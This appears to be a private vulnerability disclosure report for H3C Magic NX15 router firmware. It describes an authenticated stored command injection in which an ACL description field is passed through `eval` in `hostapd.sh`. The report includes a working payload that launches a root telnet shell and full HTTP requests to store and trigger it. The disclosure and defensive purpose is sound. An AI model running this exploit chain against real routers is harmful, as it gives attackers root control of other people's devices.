# H3C Magic NX15 `esps.wifi.acl` Authenticated Stored OS Command Injection to Root Remote Code Execution via `hostapd.sh`

## Vulnerability Summary

- Discovery date: 2026-06-11
- Researcher: coconut
- Vendor: H3C
- Product: H3C Magic NX15
- Verified firmware / software version: NX15V100R017
- Affected version(s): NX15V100R017 confirmed; other versions not verified
- Component: `esps.wifi.acl` storage path for `wireless_acl.*.description` and the `/lib/wifi/hostapd.sh` ACL reload logic
- Reachable endpoint: `POST /api/esps`
- Reachable method / action: `object="esps.wifi.acl"`, `method="add"` / `"modify"` followed by `object="esps.wifi"`, `method="setssid"`
- Authentication: administrator
- Attack vector: remote
- Impact: authenticated stored OS command injection leading to root command execution during Wi-Fi configuration reload
- Root cause class: stored command injection caused by unsafe `eval` of attacker-controlled persistent configuration data
- Candidate CWEs: `CWE-78`
- Disclosure status: private
- CVE ID: pending

## CVE Submission-Style Summary

H3C Magic NX15 firmware `NX15V100R017` contains an authenticated stored OS command injection vulnerability in the `esps.wifi.acl` configuration path. An attacker with a valid administrator session can store a payload in `wireless_acl.*.description` through `POST /api/esps`, after which `/lib/wifi/hostapd.sh` reads that persisted field and executes it through `eval` during a normal Wi-Fi configuration rebuild such as `esps.wifi.setssid`.

The issue was verified by source inspection of `/lib/wifi/hostapd.sh`, the local report, and the included PoC. On the tested target, an ACL entry containing `$(/usr/sbin/telnetd -p2482 -l/bin/sh)` was stored successfully, a later `esps.wifi.setssid` request triggered the reload path, and the device opened a root shell on TCP/2482.

## Attack Surface

The issue spans two authenticated web-management operations. First, the attacker stores a payload in `description` via `POST /api/esps` with `object="esps.wifi.acl"` and `method="add"` or `"modify"`. Second, the attacker or a legitimate administrator triggers any Wi-Fi configuration rebuild, for example `object="esps.wifi"` and `method="setssid"`. During that rebuild, `/lib/wifi/hostapd.sh` reads the stored ACL description and executes it through `eval`.

If useful, the request envelope is:

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json
AUTHENTICATION: <session>
```

And the relevant request or trigger shape is:

```json
[
  {
    "id": 1,
    "object": "esps.wifi.acl",
    "method": "add",
    "param": {
      "radio": ["2.4G", "5G"],
      "mac": "02:11:22:33:44:55",
      "description": "$(/usr/sbin/telnetd -p2482 -l/bin/sh)",
      "isAllowWifi": "false"
    }
  }
]
```

## Authentication Boundary

This issue requires a valid web administrator session token. The attacker authenticates once, stores the payload through the ACL management API, and then triggers or waits for a Wi-Fi configuration rebuild such as `esps.wifi.setssid`.

## Root Cause

### 1. Vulnerable input source

The attacker stores an arbitrary string in `wireless_acl.*.description` through the authenticated `esps.wifi.acl` API.

```text
"add":{"radio":"Array","mac":"String","description":"String","isAllowWifi":"String"}
"modify":{"id":"Integer","mac":"String","description":"String","radio":"Array","isAllowWifi":"String"}
```

### 2. Vulnerable sink

During Wi-Fi ACL loading, `/lib/wifi/hostapd.sh` reads the persisted `description` field and executes it through `eval`.

```text
if [ -n "$(uci_get wireless_acl."$1".description)" ] ;then
    eval wireless_acl_remark_list"${idx}"="$(uci_get wireless_acl."$1".description)"
fi
```

### 3. Why exploitation works

- `description` is attacker-controlled and stored persistently in the wireless ACL configuration.
- `description` is only a remark field and does not need shell evaluation for correct operation.
- `hostapd.sh` still loads it with `eval`, so command substitution such as `$(...)` becomes active shell syntax.
- A normal configuration application path (`esps.wifi.setssid`) reaches the reload logic, so exploitation does not require a pre-existing shell.
- Because the payload is stored first and triggered later, the issue can survive loss of the original session until a reload occurs.

## Reverse Engineering Evidence

### Primary function / handler evidence

- file / module: `/lib/wifi/hostapd.sh`
- function name: `wireless_acl_getAllitem()`
- function address: `N/A`
- function size: `N/A`

Relevant decompiled or source-level snippet:

```text
if [ -n "$(uci_get wireless_acl."$1".description)" ] ;then
    eval wireless_acl_remark_list"${idx}"="$(uci_get wireless_acl."$1".description)"
fi
```

### Control-flow or data-flow summary

`POST /api/esps` `object=esps.wifi.acl` -> store payload in `wireless_acl.*.description` -> later `esps.wifi.setssid` / Wi-Fi reload -> `config_load wireless_acl` -> `wireless_acl_getAllitem()` -> `eval` on persisted description -> root shell

### Secondary component evidence

- file / script / service: `/lib/wifi/hostapd.sh` VAP reload path and `esps.wifi.setssid` trigger
- role in exploitation: The payload is only executed when the Wi-Fi configuration rebuild path loads ACL entries during a normal configuration apply event.

Relevant snippet:

```text
#获取列表
idx=1
config_load wireless_acl
config_foreach wireless_acl_getAllitem acl-table
```

## Verified Exploitation Chain

### Mode A: stored payload execution during Wi-Fi reload

- prerequisites: a valid administrator session and the ability to trigger or wait for a Wi-Fi configuration rebuild
- injected field / primitive: `description` persisted in `wireless_acl.*.description`
- target path / object / resource: `esps.wifi.acl.add` / `modify` storage path and `/lib/wifi/hostapd.sh` reload logic
- verified payload:

```text
$(/usr/sbin/telnetd -p2482 -l/bin/sh)
```

Effect:
1. Authenticate to the web interface and store the payload through `esps.wifi.acl.add`.
2. Confirm that `esps.wifi.acl.getlist` returns the payload unchanged in `description`.
3. Trigger a Wi-Fi configuration rebuild through `esps.wifi.setssid` on an existing SSID entry.
4. The reload path executes the stored payload, opening a root shell on TCP/2482.

## Live Exploitation Evidence

### PoC-generated payload

```text
$(/usr/sbin/telnetd -p2482 -l/bin/sh)
```

### PoC-sent request body

```json
[
  {
    "id": 1,
    "object": "esps.wifi.acl",
    "method": "add",
    "param": {
      "radio": ["2.4G", "5G"],
      "mac": "02:11:22:33:44:55",
      "description": "$(/usr/sbin/telnetd -p2482 -l/bin/sh)",
      "isAllowWifi": "false"
    }
  }
]
```

### Success condition

The ACL entry stores the payload unchanged, a later Wi-Fi reload opens TCP/2482, and a shell connection shows `uid=0(root) gid=0(root)` or a running `/usr/sbin/telnetd -p2482 -l/bin/sh` process.

## Why This Is Stored Root Remote Code Execution

This issue is correctly classified as stored root remote code execution because the verified exploit path yields attacker-controlled code execution in the device's privileged management or update-processing context and the observed effects are not limited to inert configuration corruption. The local report and PoC demonstrate that successful exploitation crosses into the root trust boundary and produces attacker-controlled execution or installation effects that are sufficient for full device compromise.

## Minimal HTTP Request Shape

### 1. Store payload request

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json
AUTHENTICATION: <session>

[{"id":1,"object":"esps.wifi.acl","method":"add","param":{"radio":["2.4G","5G"],"mac":"02:11:22:33:44:55","description":"$(/usr/sbin/telnetd -p2482 -l/bin/sh)","isAllowWifi":"false"}}]
```

### 2. Trigger reload request

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json
AUTHENTICATION: <session>

[{"id":21,"object":"esps.wifi","method":"setssid","param":{"list":[{"radio":"5G","index":"SSID1","status":"enable","ssid":"H3C_B4D5B0_5G","charset":"utf8","auth":"wpa2psk","encrypt":"aes","key":"admin123","keyPeriod":3600,"hide":"enable","isolation":"disable","vlan":1,"accessMax":0,"curCountryCode":"","bssid":""}]}}]
```

## Minimal Vulnerable Flow

```text
Authenticated remote attacker -> store payload via `esps.wifi.acl` -> payload persists in `wireless_acl.*.description` -> later `esps.wifi.setssid` / Wi-Fi reload -> `/lib/wifi/hostapd.sh` loads ACL entries -> `eval` executes stored payload as root
```

## Included Local Submission Artifacts

- Primary local report: `report/postauth_esps_wifi_acl_hostapd_reload_rce_report.md`
- `poc/postauth_esps_wifi_acl_hostapd_reload_rce.py`
